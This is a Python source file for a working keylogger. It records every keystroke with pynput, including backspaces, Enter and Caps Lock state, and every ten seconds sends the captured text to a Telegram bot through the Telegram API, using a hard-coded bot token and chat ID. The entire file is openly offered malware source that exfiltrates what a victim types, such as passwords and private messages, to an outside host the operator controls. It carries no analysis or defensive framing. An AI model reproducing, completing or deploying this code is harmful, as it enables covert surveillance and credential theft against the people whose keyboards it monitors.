import pynput.keyboard
import threading
import requests

class KeyLogger:
    def __init__(self, interval=10, bot_token="754060526....", chat_id="6420...."):
        self.log = ""
        self.interval = interval
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.capslock_on = False
        print("[!] Keylogger Started...")
    def Process_keys(self, key):
        try:
            if key == pynput.keyboard.Key.backspace:
                self.log = self.log[:-1]
            elif key == pynput.keyboard.Key.space:
                self.log += ' '
            elif key == pynput.keyboard.Key.enter:
                self.log += '\n'
            elif key == pynput.keyboard.Key.caps_lock:
                self.capslock_on = not self.capslock_on
                self.log += '[CapsLock ON] ' if self.capslock_on else '[CapsLock OFF]'
            else:
                char = key.char
                if char:
                    self.log += char.upper() if self.capslock_on else char
        except AttributeError:
            self.log += f' [{key}] '

    def send_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            params = {
                "chat_id": self.chat_id,
                "text": message
            }
            response = requests.get(url, params=params)
            if response.status_code == 200:
                print("Message sent via Telegram.")
            else:
                print("Failed to send message via Telegram. Response:", response.text)
        except Exception as e:
            print(f"Error sending Telegram message: {e}")

    def report(self):
        if self.log.strip():
            self.send_telegram(self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def Starting_Keylogger(self):
        listener = pynput.keyboard.Listener(on_press=self.Process_keys)
        with listener:
            self.report()
            listener.join()
            
if __name__ == "__main__":
    keylogger = KeyLogger(
        interval=10,  
        bot_token="75406052....",  
        chat_id="64...." 
    )
    keylogger.Starting_Keylogger()

